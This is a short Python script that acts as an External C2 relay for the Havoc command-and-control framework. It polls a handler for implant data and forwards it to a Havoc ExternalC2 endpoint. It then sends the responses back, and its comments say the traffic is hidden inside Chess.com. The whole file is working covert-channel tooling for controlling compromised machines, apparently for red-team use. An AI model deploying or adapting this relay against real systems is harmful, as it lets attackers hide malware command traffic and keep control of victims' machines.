import requests
import json
import socket
import time
import os
import sys
import base64
import random
import string
import platform
from havoc.externalc2 import ExternalC2

def getAgentData():
    # Download and decode data from Chess.com
    res = requests.get("http://localhost:8000/handler/retrieve-agent", verify=False)
    print("[+] Retrieved agent data: "+str(res.json()))
    return base64.b64decode(res.json()["data"])

def sendData(data):
    # Encode and upload data to Chess.com
    payload = { "data" : data }
    res = requests.post("http://localhost:8000/handler/upload", json=payload, verify=False)
    return res.json()["status"]

def transmitToC2(data):
    print("[+] Transmitting data to C2: "+str(data))
    response = externalc2.transmit(data)
    print("RESPONSE: " + response + "\n")
    return response

externalc2 = ExternalC2("https://127.0.0.1:40056/ExtEndpoint")
print("[+] connected to ExternalC2 endpoint")

while True:
    agentdata = getAgentData()
    if agentdata != "":
        print("[+] Retrieved agent data: "+str(agentdata))
        res = transmitToC2(agentdata)
        print("[+] Received response from C2: "+str(res))
        sendData(base64.b64encode(res.encode('utf-8')).decode('utf-8'))
    time.sleep(5)
    